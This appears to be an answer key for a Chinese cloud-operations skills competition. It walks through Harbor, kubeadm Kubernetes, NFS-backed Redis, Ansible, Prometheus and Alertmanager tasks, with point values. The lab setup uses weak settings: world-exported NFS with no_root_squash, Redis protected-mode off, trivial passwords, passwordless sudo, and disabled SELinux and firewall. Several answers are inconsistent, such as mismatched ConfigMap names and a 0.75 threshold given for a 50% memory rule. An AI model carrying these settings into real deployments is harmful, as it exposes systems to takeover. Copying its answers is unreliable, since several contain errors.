#1.创建ca证书mkdir /cert/ -pcd /cert/ #以下命令创建ca证书openssl req  -newkey rsa:4096 -nodes -sha256 -keyout ca.key -x509 -days 365 -out ca.crt#一路回车出现Common Name 输入IP或域名Common Name (eg, your name or your server&#x27;s hostname) []:192.168.200.165#2.生成证书签名请求openssl req  -newkey rsa:4096 -nodes -sha256 -keyout 192.168.200.165.key -out 192.168.200.165.csr一路回车出现Common Name 输入IP或域名Common Name (eg, your name or your server&#x27;s hostname) []:192.168.200.165#3.生成证书echo subjectAltName = IP:192.168.200.165 &gt; extfile.cnfopenssl x509 -req -days 365 -in 192.168.200.165.csr -CA ca.crt -CAkey ca.key -CAcreateserial -extfile extfile.cnf -out 192.168.200.165.crt#4.配置harbor.ymltar -zxvf harbor-offline-installer-v2.0.1.tgzcd harborcp harbor.yml.tmpl harbor.ymlhostname=192.168.200.165ssl_cert = /cert/192.168.200.165.crt     #crt位置ssl_cert_key = /cert/192.168.200.165.key  #key的位置  #5.配置使用harbor./prepare./install.sh#将签证证书发送到其他节点mkdir –p /etc/docker/certs.d/192.168.200.165cp ca.crt /etc/docker/certs.d/192.168.200.165/ca.crtsystemctl restart docker

4.上传docker镜像在master节点使用命令将&#x2F;opt&#x2F;paas&#x2F;images目录下所有镜像导入本地。然后使用&#x2F;opt&#x2F;paas&#x2F;k8s_image_push.sh将所有镜像上传至docker仓库,遇到地址配置时请写IP地址。
请将执行k8s_image_push.sh文件的返回结果提交到答题框。
过程
#导入镜像for i in $(ls /opt/paas/images|grep tar)do  docker load -i /opt/paas/images/$idonecd /opt/paas/./k8s_image_push.sh

5.安装kubeadm工具在master及所有node节点安装Kubeadm工具并设置开机自动启动，安装完成后使用rpm命令配合grep查看Kubeadm工具是否正确安装。
请将kubectl get nodes命令的返回结果提交到答题框。【0.5分】
rpm -qa | grep kukubeadm-1.18.1-0.x86_64kubectl-1.18.1-0.x86_64kubelet-1.18.1-0.x86_64

过程：
yum -y install kubeadm-1.18.1 kubectl-1.18.1 kubelet-1.18.1systemctl enable kubelet &amp;&amp; systemctl start kubelet

6.kubeadm安装master使用kubeadm命令生成yaml文件，并修改yaml文件，设置kubernetes虚拟内部网段地址为10.244.0.0&#x2F;16，通过该yaml文件初始化master节点，然后使用kube-flannel.yaml完成控制节点初始化设置，完成后使用命令查看集群状态和所有pod。
请将kubectl get nodes命令的返回结果提交到答题框。【2分】
[root@localhost ~]# kubectl get nodesNAME     STATUS     ROLES    AGE   VERSIONmaster   NotReady   master   13s   v1.18.1

过程：
#开启路由转发（全部节点）cat &gt;&gt; /etc/sysctl.d/k8s.conf &lt;&lt;EOFnet.ipv4.ip_forward = 1 net.bridge.bridge-nf-call-ip6tables = 1 net.bridge.bridge-nf-call-iptables = 1 EOFsysctl --system  //生效#生成yaml文件kubeadm config print init-defaults  &gt; kubeadm-config.yaml#1.修改advertiseAddress,改为本机ipadvertiseAddress: 192.168.200.162#2.在yaml文件中的networking添加：podSubnet: &quot;10.244.0.0/16&quot;#3.可以通过修改container地址提高速度--image-repository=registry.aliyuncs.com/google_containers#安装master节点kubeadm init --config kubeadm-config.yaml

7.删除污点使用命令删除master节点的污点，使得Pod也可以调度到master节点上，操作成功配合grep查看master节点的污点。
请将删除master节点的污点的命令提交到答题框。【1分】
kubectl taint nodes master node-role.kubernetes.io/master-

过程
#删除污点kubectl taint nodes master node-role.kubernetes.io/master-#查看master污点kubectl describe nodes master |grep TaintsTaints:             node.kubernetes.io/not-ready:NoExecute

8.安装kubernetes网络插件使用kube-flannel.yaml安装kubernetes网络插件，安装完成后使用命令查看节点状态。
请将kubectl get nodes命令的返回结果提交到答题框。【0.5分】
[root@localhost paas]# kubectl get nodesNAME     STATUS   ROLES    AGE   VERSIONmaster   Ready    master   12m   v1.18.1

过程：
master
kubectl apply -f /opt/paas/yaml/flannel/kube-flannel.yaml[root@localhost paas]# kubectl get nodesNAME     STATUS   ROLES    AGE   VERSIONmaster   Ready    master   12m   v1.18.1

9.kubernetes图形化界面的安装使用recommended.yaml和dashboard-adminuser.yaml安装kubernetesdashboard界面，完成后查看首页。
请将kubectl get pod,svc -n kubernetes-dashboard命令的返回结果提交到答题框。【1分】
[root@master ~]# kubectl get pod,svc -n kubernetes-dashboardNAME                                             READY   STATUS    RESTARTS   AGEpod/dashboard-metrics-scraper-6b4884c9d5-9g89j   1/1     Running   0          22dpod/kubernetes-dashboard-5585794759-7h42g        1/1     Running   0          22dNAME                                TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)         AGEservice/dashboard-metrics-scraper   ClusterIP   10.102.214.55   &lt;none&gt;        8000/TCP        22dservice/kubernetes-dashboard        NodePort    10.99.171.141   &lt;none&gt;        443:30000/TCP   22d

过程：
#部署dashboardmkdir dashboard-certscd dashboard-certs/kubectl create namespace kubernetes-dashboardopenssl genrsa -out dashboard.key 2048openssl req -days 36000 -new -out dashboard.csr -key dashboard.key -subj &#x27;/CN=dashboard-cert&#x27;openssl x509 -req -in dashboard.csr -signkey dashboard.key -out dashboard.crtkubectl create secret generic kubernetes-dashboard-certs --from-file=dashboard.key --from-file=dashboard.crt -n kubernetes-dashboardsed -i &quot;s/kubernetesui/$IP\/library/g&quot; /opt/yaml/dashboard/recommended.yamlkubectl apply -f /opt/yaml/dashboard/recommended.yamlkubectl apply -f /opt/yaml/dashboard/dashboard-adminuser.yaml#若pod未成功创建，修改一下镜像的地址

10.扩展计算节点在所有node节点上使用kubeadm config命令生成yaml文件，并通过yaml文件将node节点加入kubernetes集群。完成后在master节点上查看所有节点状态。
请将kubectl get nodes命令的返回结果提交到答题框。【0.5分】
[root@master ~]# kubectl get nodesNAME     STATUS   ROLES    AGE   VERSIONmaster   Ready    master   22d   v1.18.1node1    Ready    &lt;none&gt;   22d   v1.18.1node2    Ready    &lt;none&gt;   22d   v1.18.1

过程：
#生成添加节点的配置文件kubeadm config print join-defaults &gt; kubeadm-config.yaml#需要修改：apiServerEndpoint：连接apiserver的地址，即master的api地址，这里可以改为192.168.200.162:6443,如果master集群部署的话，这里需要改为集群vip地址token及tlsBootstrapToken：连接master使用的token，这里需要与master上的InitConfiguration中的token配置一致name：node节点的名称，如果使用主机名，需要确保master节点可以解析该主机名。否则的话可直接使用ip地址#添加节点kubeadm join --config kubeadm-config.yaml#查看nodes节点是否ready(controller)kubectl get nodes

任务三 存储配置(5分)1.NFS配置在master节点安装nfs，并配置6个共享目录，启动后查看共享目录。并在各node节点安装nfs客户端并查看共享目录。
请将showmount -e master命令的返回结果提交至答题框。【2分】
[root@node1 ~]# showmount -e masterExport list for master:/nfs6 */nfs5 */nfs4 */nfs3 */nfs2 */nfs1 *

过程：
master
#安装nfs相关软件yum install -y nfs-utils rpcbind#添加6个共享目录vi /etc/exports/nfs1 *(rw,sync,no_root_squash,no_subtree_check)/nfs2 *(rw,sync,no_root_squash,no_subtree_check)/nfs3 *(rw,sync,no_root_squash,no_subtree_check)/nfs4 *(rw,sync,no_root_squash,no_subtree_check)/nfs5 *(rw,sync,no_root_squash,no_subtree_check)/nfs6 *(rw,sync,no_root_squash,no_subtree_check)systemctl start nfs-server rpcbindsystemctl enable nfs-server rpcbind

其他节点：
#yum install -y nfs-utilsshowmount -e master

2.PV配置每一个Redis Pod都需要一个独立的PV来存储自己的数据，创建一个pv.yaml文件,包含6个PV，分别对应nfs中的6个共享目录。
请将yaml文件中的内容提交至答题框。【2分】
cat pv.yamlapiVersion: v1kind: PersistentVolumemetadata:  name: pv1spec:  nfs:    server: 192.168.200.162    path: /nfs1  capacity:    storage: 1Gi  accessModes: [&quot;ReadWriteMany&quot;,&quot;ReadOnlyMany&quot;]---apiVersion: v1kind: PersistentVolumemetadata:  name: pv2spec:  nfs:    server: 192.168.200.162    path: /nfs2  capacity:    storage: 1Gi  accessModes: [&quot;ReadWriteMany&quot;,&quot;ReadOnlyMany&quot;]---apiVersion: v1kind: PersistentVolumemetadata:  name: pv3spec:  nfs:    server: 192.168.200.162    path: /nfs3  capacity:    storage: 1Gi  accessModes: [&quot;ReadWriteMany&quot;,&quot;ReadOnlyMany&quot;]---apiVersion: v1kind: PersistentVolumemetadata:  name: pv4spec:  nfs:    server: 192.168.200.162    path: /nfs4  capacity:    storage: 1Gi  accessModes: [&quot;ReadWriteMany&quot;,&quot;ReadOnlyMany&quot;]---apiVersion: v1kind: PersistentVolumemetadata:  name: pv5spec:  nfs:    server: 192.168.200.162    path: /nfs5  capacity:    storage: 1Gi  accessModes: [&quot;ReadWriteMany&quot;,&quot;ReadOnlyMany&quot;]---apiVersion: v1kind: PersistentVolumemetadata:  name: pv6spec:  nfs:    server: 192.168.200.162    path: /nfs6  capacity:    storage: 1Gi  accessModes: [&quot;ReadWriteMany&quot;,&quot;ReadOnlyMany&quot;]

3.创建Configmap将提供的redis.conf配置文件创建为名称为redis-conf的Configmap对象，创建成功后，查看redis-conf的详细信息。
请将kubectl describe cm redis-conf命令的返回结果提交至答题框。【0.5分】
[root@master yaml]# kubectl describe cm redis-conf                                    Name:         redis-configNamespace:    defaultLabels:       &lt;none&gt;Annotations:  &lt;none&gt;Data====redis.conf:----appendonly yescluster-enabled yescluster-config-file /var/lib/redis/nodes.confcluster-node-timeout 5000dir /var/lib/redisport 6379Events:  &lt;none&gt;

过程：
#创建configMapkubectl create configmap redis-confg --from-file=/root/redis.conf

4.导入镜像使用提供的redis.tar导入所需的镜像，并重新修改镜像tag并将镜像上传至harbor镜像仓库中。
请将上述操作的所有命令提交至答题框。【0.5分】
[root@master ~]# docker load -i redis.tar9f54eef41275: Loading layer  75.16MB/75.16MBe9e9d8cf772b: Loading layer  3.584kB/3.584kB8b504a175fb9: Loading layer  229.7MB/229.7MBLoaded image: ubuntu:redis-trip2edcec3590a4: Loading layer  83.86MB/83.86MB9b24afeb7c2f: Loading layer  338.4kB/338.4kB4b8e2801e0f9: Loading layer  4.274MB/4.274MB529cdb636f61: Loading layer   27.8MB/27.8MB9975392591f2: Loading layer  2.048kB/2.048kB8e5669d83291: Loading layer  3.584kB/3.584kBLoaded image: redis:latest[root@master ~]# docker tag redis:latest 192.168.200.165/library/redis:latest[root@master ~]# docker push 192.168.200.165/library/redis:latestThe push refers to repository [192.168.200.165/library/redis]8e5669d83291: Pushed9975392591f2: Pushed529cdb636f61: Pushed4b8e2801e0f9: Pushed9b24afeb7c2f: Pushed2edcec3590a4: Pushedlatest: digest: sha256:563888f63149e3959860264a1202ef9a644f44ed6c24d5c7392f9e2262bd3553 size: 1573

任务四redis集群部署(10分)1.基于StatefulSet创建Redis集群节点编写redis.yml文件，创建statefulset资源，基于redis镜像创建6个pod副本，并且通过pod的亲和性配置保证pod尽量分散在不同的节点上，然后通过volumeMounts将pv及redis-conf的Configmap分别挂载到各个容器中。然后基于该文件创建redis集群节点，完成后查看所有redis的pod资源。
请将kubectl get pods -o wide命令的返回结果提交至答题框。【3分】
[root@master yaml]# kubectl get pods -o wideNAME            READY   STATUS    RESTARTS   AGE   IP            NODE     NOMINATED NODE   READINESS GATESredis-app-0     1/1     Running   0          9s    10.244.1.5    node2    &lt;none&gt;           &lt;none&gt;redis-app-1     1/1     Running   0          8s    10.244.2.10   node1    &lt;none&gt;           &lt;none&gt;redis-app-2     1/1     Running   0          6s    10.244.0.6    master   &lt;none&gt;           &lt;none&gt;redis-app-3     1/1     Running   0          5s    10.244.1.6    node2    &lt;none&gt;           &lt;none&gt;redis-app-4     1/1     Running   0          4s    10.244.2.11   node1    &lt;none&gt;           &lt;none&gt;redis-app-5     1/1     Running   0          2s    10.244.1.7    node2    &lt;none&gt;           &lt;none&gt;

redis.yaml
apiVersion: apps/v1kind: StatefulSetmetadata:  name: redis-appspec:  serviceName: &quot;redis-service&quot;  replicas: 6  selector:    matchLabels:      app: redis  template:    metadata:      labels:        app: redis        appCluster: redis-cluster    spec:      terminationGracePeriodSeconds: 20      affinity:        podAntiAffinity:          preferredDuringSchedulingIgnoredDuringExecution:          - weight: 100            podAffinityTerm:              labelSelector:                matchExpressions:                - key: app                  operator: In                  values:                  - redis              topologyKey: kubernetes.io/hostname      containers:      - name: redis        image: 192.168.200.165/library/redis:latest        command:          - &quot;redis-server&quot;                  #redis启动命令        args:          - &quot;/etc/redis/redis.conf&quot;         #redis-server后面跟的参数,换行代表空格          - &quot;--protected-mode&quot;              #允许外网访问          - &quot;no&quot;        # command: redis-server /etc/redis/redis.conf --protected-mode no        resources:                          #资源          requests:                         #请求的资源            cpu: &quot;100m&quot;                     #m代表千分之,相当于0.1 个cpu资源            memory: &quot;100Mi&quot;                 #内存100m大小        ports:            - name: redis              containerPort: 6379              protocol: &quot;TCP&quot;            - name: cluster              containerPort: 16379              protocol: &quot;TCP&quot;        volumeMounts:          - name: &quot;redis-conf&quot;              #挂载configmap生成的文件            mountPath: &quot;/etc/redis&quot;         #挂载到哪个路径下          - name: &quot;redis-data&quot;              #挂载持久卷的路径            mountPath: &quot;/var/lib/redis&quot;      volumes:      - name: &quot;redis-conf&quot;                  #引用configMap卷        configMap:          name: &quot;redis-conf&quot;          items:            - key: &quot;redis.conf&quot;             #创建configMap指定的名称              path: &quot;redis.conf&quot;            #里面的那个文件--from-file参数后面的文件  volumeClaimTemplates:                     #进行pvc持久卷声明,  - metadata:      name: redis-data    spec:      accessModes:      - ReadWriteMany      resources:        requests:          storage: 200M

2.redis集群初始化使用ubuntu:redis-trib中的redis-trib工具对redis集群进行初始化，初始化后3个master节点，3个slave节点，3个master节点各对应一个slave节点。初始化成功后查看集群状态。
连结到任意一个Redis Pod将cluster nodes命令的返回结果提交至答题框。【3分】


3.为redis集群配置service编写service.yaml文件创建一个Service，用于为Redis集群提供访问和负载均衡，代理redis集群,在K8S集群中暴露6379端口,创建成功后，查看service状态。
请将kubectl get svc redis-access-service -o wide命令的返回结果提交至答题框。【2分】
[root@master yaml]# kubectl get svc redis-access-service -o wideNAME                   TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)    AGE   SELECTORredis-access-service   ClusterIP   10.104.245.9   &lt;none&gt;        6379/TCP   2s    app=redis,appCluster=redis-cluster

vi service.yaml
apiVersion: v1kind: Servicemetadata:  name: redis-access-service  labels:    app: redisspec:  ports:  - name: redis-port    protocol: &quot;TCP&quot;    port: 6379    targetPort: 6379  selector:    app: redis    appCluster: redis-cluster

4.集群主从切换任意选择一个redis的master节点，进入该pod中查看该节点在集群中的角色信息，然后将该节点pod手动删除，然后查看状态，重新创建后，进入该pod查看节点角色信息及集群信息。查看是否自动完成主从切换。
最后进入该pod将role命令的返回结果提交至答题框。【2分】


C场次题目：企业级应用的自动化部署和运维


设备名称
主机名
接口
ip地址
角色



云服务器1
monitor
ens33
192.168.200.100
prometheus.grafana,ansible


云服务器2
slave1
ens33
192.168.200.101
agent


云服务器3
slave2
ens33
192.168.200.102
agent


任务1企业级应用的自动化部署(17分)1.ansible自动化运维工具的安装请使用提供的软件包在monitor节点安装ansible，安装完成后使用ansible –version命令验证是否安装成功。为所有节点添加test用户，设置用户密码为000000，为test用户设置免密sudo，配置ssh免密登录，使monitor节点能够免密登录所有节点的test用户。
请将ansible –version命令的返回结果提交到答题框。【3分】
ansible --versionansible 2.4.6.0  config file = /etc/ansible/ansible.cfg  configured module search path = [u&#x27;/root/.ansible/plugins/modules&#x27;, u&#x27;/usr/share/ansible/plugins/modules&#x27;]  ansible python module location = /usr/lib/python2.7/site-packages/ansible  executable location = /usr/bin/ansible  python version = 2.7.5 (default, Apr 11 2018, 07:36:10) [GCC 4.8.5 20150623 (Red Hat 4.8.5-28)]

过程：
monitor
#安装依赖yum install -y jinja2 PyYAML cryptographyrpm -ivh ansible-2.4.6.0-1.el7.ans.noarch.rpmansible --version

全部节点
useradd testpasswd test#设置免密sudo 在root    ALL=(ALL)       ALL下面添加visudotest ALL=(ALL) NOPASSWD:ALL

monitor
ssh-keygen ssh-copy-id test@192.168.200.100ssh-copy-id test@192.168.200.101ssh-copy-id test@192.168.200.102

2.ansible 自动化运维工具的初始化【3 分】创建 &#x2F;root&#x2F;ansible 目录作为工作目录，在该目录内创建 ansible.cfg 文件并完成以下配置，清单文件位置为 &#x2F;root&#x2F;ansible&#x2F;inventory，登录用户为 test，登录时不需要输入密码。设置并行主机数量为 2，允许 test 用户免密提权到 root。
将 ansible.cfg 文件内容粘贴到答题框。
[defaults]inventory=./inventoryforks=2remote_user=testask_pass=false[privilege_escalation]become=truebecome_method=sudobecome_user=rootbecome_ask_pass=false

过程：
#创建工作目录mkdir /root/ansible#编辑cfgvi ansible.cfg[defaults]inventory=./inventoryforks=2remote_user=testask_pass=false[privilege_escalation]become=truebecome_method=sudobecome_user=rootbecome_ask_pass=false

3.主机清单的编写。
编写主机清单文件，创建monitor用户组,monitor用户组内添加monitor主机，创建slave用户组, slave组内添加slave1和slave2主机，主机名不得使用IP地址。
请将ansible all -m ping命令的返回结果提交至答题框。【2分】
[root@monitor ansible]# ansible all -m ping [WARNING]: Found both group and host with same name: masterslave2 | SUCCESS =&gt; &#123;    &quot;changed&quot;: false,    &quot;failed&quot;: false,    &quot;ping&quot;: &quot;pong&quot;&#125;slave1 | SUCCESS =&gt; &#123;    &quot;changed&quot;: false,    &quot;failed&quot;: false,    &quot;ping&quot;: &quot;pong&quot;&#125;monitor | SUCCESS =&gt; &#123;    &quot;changed&quot;: false,    &quot;failed&quot;: false,    &quot;ping&quot;: &quot;pong&quot;&#125;

过程：
#需要在/etc/hosts添加映射192.168.200.100 monitor192.168.200.101 slave1192.168.200.102 slave2#在/root/ansible目录下创建inventoryvi inventory[monitor]monitor[slave]slave1slave2

4.使用自动化工具对 master 节点进行初始化【2 分】请编写 prometheus.yml 控制 monitor 主机组，使用对应模块将 SELinux 临时状态和开机启动状态也设置为 disabled。请使用 ansible 对应模块安装时间同步服务，使用文本编辑模块将该服务的作用域设置为 0.0.0.0&#x2F;0，并设置状态为启动和开机自动启动。首先将提供的 prometheus-2.37.0.linux-amd64.tar.gz 使用文件拷贝模块将该压缩包拷贝到目标主机的&#x2F;usr&#x2F;local&#x2F; 下，使用 shell 模块解压该压缩包。
请将prometheus.yml文件中的内容提交至答题框。【4分】
- hosts: monitor  remote_user: root  tasks:    - name: SELINUX=disabled      selinux: state=disabled    - name: stop firewalld      shell: &#x27;sudo systemctl stop firewalld &amp;&amp; sudo systemctl disable firewalld&#x27;    - name: install chrony      yum: name=chrony state=present    - name: allow 0.0.0.0/0      blockinfile: path=/etc/chrony.conf block=&quot;allow 0.0.0.0/0&quot;    - name: start chrony      service: name=chronyd state=started enabled=yes    - name: copy promethus      copy: src=/root/prometheus-2.37.0.linux-amd64.tar.gz dest=/usr/local/    - name: tar prometheus      shell: &#x27;sudo tar -zxvf /usr/local/prometheus-2.37.0.linux-amd64.tar.gz -C /usr/local&#x27;

过程：
需要上传Prometheus到root目录下，在工作目录下创建prometheus.yml

5.使用自动化运维工具完成企业级应用的部署。
编写prometheus.yml.j2模板文件，将所有slave节点信息添加到该文件中，但是被管节点的主机名信息必须使用变量IP地址可以手动输入。完成后请创建node_exporter.yml文件，编写第一个play，将该play命名为slave，该play控制的主机组为slave，使用ansible模块将node_exporter-1.3.1.linux-amd64.tar.gz发送到slave主机组的&#x2F;usr&#x2F;local&#x2F;下，使用一个shell模块解压该压缩包，并启动该服务。随后编写第二个play，将第二个play命名为monitor，第二个play控制monitor节点，首先使用ansible模块将prometheus.yml.j2文件传输到monitor节点，然后使用script模块将prometheus启动。使用对应模块将grafana-8.1.2-1.x86_64.rpm包发送到被控节点的&#x2F;mnt&#x2F;目录下，然后使用对应模块将该软件包安装，安装完成后设置grafana服务启动并设置开机自动启动。使用浏览器登录prometheus查看prometheus是否成功监控所有slave节点。
请将node_exporteryml文件内容提交到答题框。【5分】
---- hosts: slave  name: slave  tasks:    - name: copy node_expose      copy: src=/root/node_exporter-1.3.1.linux-amd64.tar.gz dest=/usr/local/    - name: tar node_expose      shell: &#x27;sudo tar -zxvf /usr/local/node_exporter-1.3.1.linux-amd64.tar.gz -C /usr/local/&#x27;    - name: start node_export      shell: &#x27;sudo nohup /usr/local/node_exporter-1.3.1.linux-amd64/node_exporter &amp;&#x27;- hosts: monitor  name: monitor  vars:    node1: 192.168.200.101    node2: 192.168.200.102  tasks:    - name: template j2      template: src=./prometheus.yml.j2 dest=/usr/local/prometheus-2.37.0.linux-amd64/prometheus.yml    - name: start prometheus      script: /root/ansible/nohup.sh    - name: copy grafana      copy: src=/root/grafana-8.1.2-1.x86_64.rpm dest=/mnt/    - name: install repaired      shell: &#x27;sudo yum install -y fontconfig urw-fonts &#x27;    - name: install grafana      shell: &#x27;sudo rpm -ivh /mnt/grafana-8.1.2-1.x86_64.rpm&#x27;    - name: enable gtafana      service: name=grafana-server state=started enabled=yes

过程：
prometheus.yml.j2
# my global configglobal:  scrape_interval: 15s # Set the scrape interval to every 15 seconds. Default is every 1 minute.  evaluation_interval: 15s # Evaluate rules every 15 seconds. The default is every 1 minute.  # scrape_timeout is set to the global default (10s).# Alertmanager configurationalerting:  alertmanagers:    - static_configs:        - targets:          # - alertmanager:9093# Load rules once and periodically evaluate them according to the global &#x27;evaluation_interval&#x27;.rule_files:  # - &quot;first_rules.yml&quot;  # - &quot;second_rules.yml&quot;# A scrape configuration containing exactly one endpoint to scrape:# Here it&#x27;s Prometheus itself.scrape_configs:  # The job name is added as a label `job=&lt;job_name&gt;` to any timeseries scraped from this config.  - job_name: &quot;prometheus&quot;    # metrics_path defaults to &#x27;/metrics&#x27;    # scheme defaults to &#x27;http&#x27;.    static_configs:      - targets: [&quot;localhost:9090&quot;]  - job_name: &quot;node_exporter&quot;    static_configs:      - targets: [&quot;&#123;&#123;node1&#125;&#125;:9100&quot;,&quot;&#123;&#123;node2&#125;&#125;:9100&quot;]

node_exporter.yml
---- hosts: slave  name: slave  tasks:    - name: copy node_expose      copy: src=/root/node_exporter-1.3.1.linux-amd64.tar.gz dest=/usr/local/    - name: tar node_expose      shell: &#x27;sudo tar -zxvf /usr/local/node_exporter-1.3.1.linux-amd64.tar.gz -C /usr/local/&#x27;    - name: start node_export      shell: &#x27;sudo nohup /usr/local/node_exporter-1.3.1.linux-amd64/node_exporter &amp;&#x27;- hosts: monitor  name: monitor  vars:    node1: 192.168.200.101    node2: 192.168.200.102  tasks:    - name: template j2      template: src=./prometheus.yml.j2 dest=/usr/local/prometheus-2.37.0.linux-amd64/prometheus.yml    - name: start prometheus      script: /root/ansible/nohup.sh    - name: copy grafana      copy: src=/root/grafana-8.1.2-1.x86_64.rpm dest=/mnt/    - name: install repaired      shell: &#x27;sudo yum install -y fontconfig urw-fonts &#x27;    - name: install grafana      shell: &#x27;sudo rpm -ivh /mnt/grafana-8.1.2-1.x86_64.rpm&#x27;    - name: enable gtafana      service: name=grafana-server state=started enabled=yes

#因为启动Prometheus需要使用scrpit模块，所以需要在写一个脚本文件，通过脚本文件启动监控系统nohup.sh#!/bin/bashcd /usr/local/prometheus-2.37.0.linux-amd64/nohup ./prometheus &amp;

任务 2 企业级应用的运维（12 分）1.使用 prometheus 监控 mysqld 服务将提供的mysqld_exporter-0.14.0.linux-amd64.tar.gz 发送到agent虚拟机&#x2F;usr&#x2F;local&#x2F;目录下解压并安装mariadb服务。进入mariadb数据库中创建mysqld_monitor用户并授权，然后创建mariadb配置文件，内容为数据库用户名密码。启动mysqld_exporter组件确保9104端口启动。回到prometheus节点修改prometheus.yml文件并添加mysql被监控信息。重启prometheus，随后web界面刷新并查看mysqld被控信息。
请将ps -ef | grep prometheus命令的返回结果提交至答题框。【3分】
[root@monitor prometheus-2.37.0.1inuax-amd64]# ps -ef l grep prometheusroot 23115 23073 006:50 pts/5 00:00:00 ./prometheusroot 23125 23073 006:51 pts/5 00:00:00 grep --color=auto prometheus

过程：
vi mysqld_exporter.yml
---- hosts: slave  name: slave   tasks:    - name: copy mysqld_exporter      copy: src=/root/mysqld_exporter-0.14.0.linux-amd64.tar.gz dest=/usr/local/    - name: tar it      shell: &#x27;sudo tar -zxvf /usr/local/mysqld_exporter-0.14.0.linux-amd64.tar.gz -C /usr/local&#x27;    - name: anzhuang mariadb      shell: &#x27;sudo yum install -y mariadb*&#x27;    - name: start mysqld      service: name=mariadb state=started enabled=yes

在agent节点
#授权mysql&gt;grant select,replication client,process ON *.* to &#x27;mysql_monitor&#x27;@&#x27;localhost&#x27; identified by &#x27;123&#x27;;&gt;flush privileges;&gt; quit#创建一个mariadb文件，并写上连接的用户和密码vi /usr/local/mysqld_exporter-0.14.0.linux-amd64/.my.cnf[client]user=mysql_monitorpassword=123#启动mysqld_exporternohup /usr/local/mysqld_exporter-0.14.0.linux-amd64/mysqld_exporter --config.my-cnf=/usr/local/mysqld_exporter-0.14.0.linux-amd64/.my.cnf &amp;#确认是否开启netstat -nltp | grep 9104

回到master节点
vi /usr/local/prometheus-2.37.0.linux-amd64/prometheus.yml - job_name: &#x27;mysql&#x27;   static_configs:     - targets: [&#x27;192.168.200.101:9104&#x27;,&#x27;192.168.200.102:9104&#x27;]          #重启服务pkill prometheusnohup /usr/local/prometheus-2.37.0.linux-amd64/prometheus &amp;

⒉.安装alertmanager报警组件将提供的alertmanager-0.21.0.linux-amd64.tar.gz上传到prometheus节点&#x2F;usr&#x2F;local&#x2F;目录下并解压，创建软连接alertmanager-0.23.0.linux-amd64&#x2F;alertmanager。创建service启动文件名为alertmanager.service，然后启动alertmanager查看9093端口。在prometheus.yml配置文件中添加alertmanager信息并重新启动prometheus服务，在agent上停止node_exporter服务。到web界面中查看警报管理器状态是否正常和agent状态是否异常。
请将alertmanager.service添加的内容提交到答题框。【3分】
[Unit]Description=alertmanager[Service]ExecStart=/usr/local/alertmanager-0.21.0.linux-amd64/alertmanager --config.file=/usr/local/alertmanager-0.21.0.linux-amd64/alertmanager.ymlExecReload=/bin/kill -HUP $MAINPIDKillMode=processRestart=on-failure[Install]WantedBy=multi-user.target

过程
tar -zxvf alertmanager-0.21.0.linux-amd64.tar.gz -C /usr/local/ln -s alertmanager-0.23.0.linux-amd64/ alertmanager#创建service启动文件vi /usr/lib/systemd/system/alertmanager.service[Unit]Description=alertmanager[Service]ExecStart=/usr/local/alertmanager-0.21.0.linux-amd64/alertmanager --config.file=/usr/local/alertmanager-0.21.0.linux-amd64/alertmanager.ymlExecReload=/bin/kill -HUP $MAINPIDKillMode=processRestart=on-failure[Install]WantedBy=multi-user.targetsystemctl daemon-reloadsystemctl start alertmanager#修改Prometheus配置文件  - job_name: &#x27;altermanager&#x27;    static_configs:      - targets: [&#x27;localhost:9093&#x27;]      pkill prometheusnohup /usr/local/prometheus/prometheus.yml &amp;

agent
pkill node_exporternohup /usr/local/node_exporter-1.3.1.linux-amd64/node_exporter &amp;


3.alertmanager告警邮件文件编写Prometheus虚拟机&#x2F;usr&#x2F;local&#x2F;akertmanager&#x2F;中存在着一个alertmanager.yml文件，请根据提供的地址和模板编写告警所发送到的email邮箱地址信息。
将alertmanager.yml文件修改的内容提交至答题框。【3分】
smtp_auth_username: &quot;1234567890@qq.com&quot; # 登录用户名  smtp_auth_password: &quot;auth_pass&quot; # 此处的auth password是邮箱的第三方登录授权密码，而非用户密码，尽量用QQ来测试。  smtp_require_tls: false # 有些邮箱需要开启此配置，这里使用的是163邮箱，仅做测试，不需要开启此功能。route:  receiver: ops  group_wait: 30s # 在组内等待所配置的时间，如果同组内，30秒内出现相同报警，在一个组内出现。  group_interval: 5m # 如果组内内容不变化，合并为一条警报信息，5m后发送。  repeat_interval: 24h # 发送报警间隔，如果指定时间内没有修复，则重新发送报警。  group_by: [alertname]  # 报警分组  routes:      - match:          team: operations        group_by: [env,dc]        receiver: &#x27;ops&#x27;      - receiver: ops # 路由和标签，根据match来指定发送目标，如果 rule的lable 包含 alertname， 使用 ops 来发送        group_wait: 10s        match:          team: operations# 接收器指定发送人以及发送渠道receivers:# ops分组的定义- name: ops  email_configs:  - to: &#x27;9935226@qq.com,xxxxx@qq.com&#x27; # 如果想发送多个人就以 &#x27;,&#x27;做分割，写多个邮件人即可。    send_resolved: true    headers:      from: &quot;警报中心&quot;      subject: &quot;[operations] 报警邮件&quot;      to: &quot;小煜狼皇&quot;

4.alertmanager告警规则编写
在prometheus虚拟机的prometheus路径下存在一个&#x2F;rules目录，目录下有一个node_rules.yml文件。请根据提供信息仿照模板编写:
1.内存大于50%报警规则;
2.cpu资源利用率大于75%报警规则;
3.主机磁盘每秒读取数据&gt;5OMB%报警规则;部门名称自定义。
请将上述三项规则的内容提交至答题框。【3分】
groups:- name: node_health  rules:  - alert: HighMemoryUsage    expr: 1-(node_memory_MemAvailable_bytes / node_memory_MemTotal_bytes) &gt; 0.75    for: 1m    labels:      severity: warning    annotations:      summary: High memory usage  - alert: HighCPUUseage    expr: 1-sum(increase(node_cpu_seconds_total&#123;mode=&quot;idle&quot;&#125;[1m])) by (instance) / sum(increase(node_cpu_seconds_total[1m])) by (instance) &gt; 0.75    for: 1m    labels:      severity: warning    annotations:      summary: High CPU usage  - alert: HighReadTime    expr: sum(irate(node_disk_read_bytes_total[1m])) by (instance) &gt; 50 #这个不确定对不对    for: 1m    labels:      severity: warning    annotations:      summary: High Read Time

过程
在prometheus路径下创建一个/rules目录，并创建yml文件创建完成后修改prometheus.yml文件rule_files:  - &quot;./rules/node_rules.yml&quot;#重启Prometheuspkill prometheusnohup /usr/local/prometheus-2.37.0.linux-amd64/prometheus &amp;

1.表4中的公网IP和私网IP以自己云主机显示为准，每个人的公网IP和私网IP不同。使用第三方软件远程连接云主机，使用公网IP连接。
2.华为云中云主机名字已命好，直接使用对应名字的云主机即可。
